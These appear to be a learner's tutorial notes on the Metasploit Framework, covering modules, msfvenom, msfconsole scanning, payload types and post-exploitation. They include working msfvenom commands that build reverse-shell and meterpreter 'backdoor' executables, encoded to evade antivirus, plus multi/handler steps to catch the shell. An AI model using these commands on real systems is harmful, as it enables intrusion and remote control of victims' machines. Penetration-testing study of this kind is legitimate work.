Metasploit Framework:
It is a framework developed by rapid7.It is written in Ruby language.
They add the modules and exploits after repetitive testing.
With these exploits we can hack into vulnerable machines and devices.

Metasploit is using postgresql.
We have to connect to the msf database to access the msf console.

"msfdb reinit" - this command reinitialize the database and starts

[msf](Jobs:0 Agents:0) >> db_status
[*] Connected to msf. Connection type: postgresql.
Enter db_status in msfconsole to check if database is connected

Modules:
Auxiliary:
These auxiliary modules contains everything other than exploits.
Scanners, fuzzers, enum scripts etc.

Encoders:
These encoder modules contains encoders that can encode the exploits, so that antivirus can't detect it.

Exploits:
This module contain exploits works on multiple platforms.

Nops:
Nops means No Operation.
Generally used in exploit development

Payloads:
This module contains payloads such as bind tcp, reverse tcp etc.

Post:
This contains post exploitation modules.
You can use this module only after getting access to the target machine.

MSF Venom:
It is a metasploit standalone payload generator.

msfvenom -l  all
This will list all modules that can be used with msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -a x86 -f c
-p stands for payload
-a stands for architecture
-f stands for format 

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -a x86 -b "\x00" -f c
-b is used to remove the bad characters.
\x00 is the nullbyte

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -a x86 -b "\x00" -e x86/shikata_ga_nai -f exe > payload.exe
Here we are using encoder and getting the payload in exe format and saving it to a new exe file.
When trying to bypass antivirus, just focus on bypassing the antivirus that your target has.
If your target uses kaspersky, then focus on bypassing that only, you don't need to bypass every antivirus.


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.29 LPORT=1234 -b "\x00\x0a\0x0d" -e x86/shikata_ga_nai -f c
Here we are removing x0a\x0d which are \n and \r...

By using encoders we can encode the same payload again and again.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.251 LPORT=1234 -b "\x00\x0d\x0a" -e x86/shikata_ga_nai -f c -i 5
Here we are encoding the same payload 5 times.
-i is the iterations(no.of times the payload has to encoded)

------------------------------------------------------------------------------------------------------


MSF CONSOLE:

setg RHOSTS 192.168.0.46
The above command is used to set global value.
SO if you are working with the same target,  then you can set it.

db_nmap -v -n -Pn 192.168.29.186
This will store all the output in the storage and give us in xml format.
-v = verbose
-n = no-dns
-Pn = Ping scan

msf6 > hosts
This will give host details of last scan

msf6 > services
This will give service details of last scan

msf6 > search portscan
This will give us all portscanners in msf

msf6 > search type:auxiliary smb
This will search for payloads or scanners in the particular module.

Reference:
https://www.offensive-security.com/metasploit-unleashed/payloads/

There are 3 types of payload modules in metasploit.
1) Singles
2) Stagers
3) Stages

Single payloads:
This type of payload is a single file, executed at once.
eg: windows/shell_bind_tcp is a single payload with no stage
 
Stagers:
Stagers setup a network connection between the attacker and victim and are designed to be small and reliable.
First, stagers will get executed in the attacker machine, then it will get the stages and will get executed. It is very less in size.
eg: windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).

Stages:
Stages are payload components that are downloaded by Stagers modules.
Payload stages automatically use ‘middle stagers’
A single recv() fails with large payloads
The stager receives the middle stager
The middle stager then performs a full download


Meterpreter is a Metasploit attack payload that provides an interactive shell to the attacker from which to explore the target machine and execute code
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip-addr> LPORT=1234 -a x86 -b "\x00\x0a\x0d" -f exe > meterpreter_backdoor.exe

Multihandler:
multi/handler, which is a stub that handles exploits launched outside of the framework.
stub is a part of exploit.
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <ip-addr>
msf6 > set LPORT <port>
msf6 > run

First make a meterpreter payload and send it to target machine.
Then run the multi/handler commands.
Now execute the meterpreter payload in target machine.
Now you will get the shell.


POST EXPLOITATION:
meterpreter > getprivs
meterpreter > getsystem
meterpreter > getuid
"Now the privilege escalation is successfull"

meterpreter > screenshot
"You will get the screenshot of the target system"
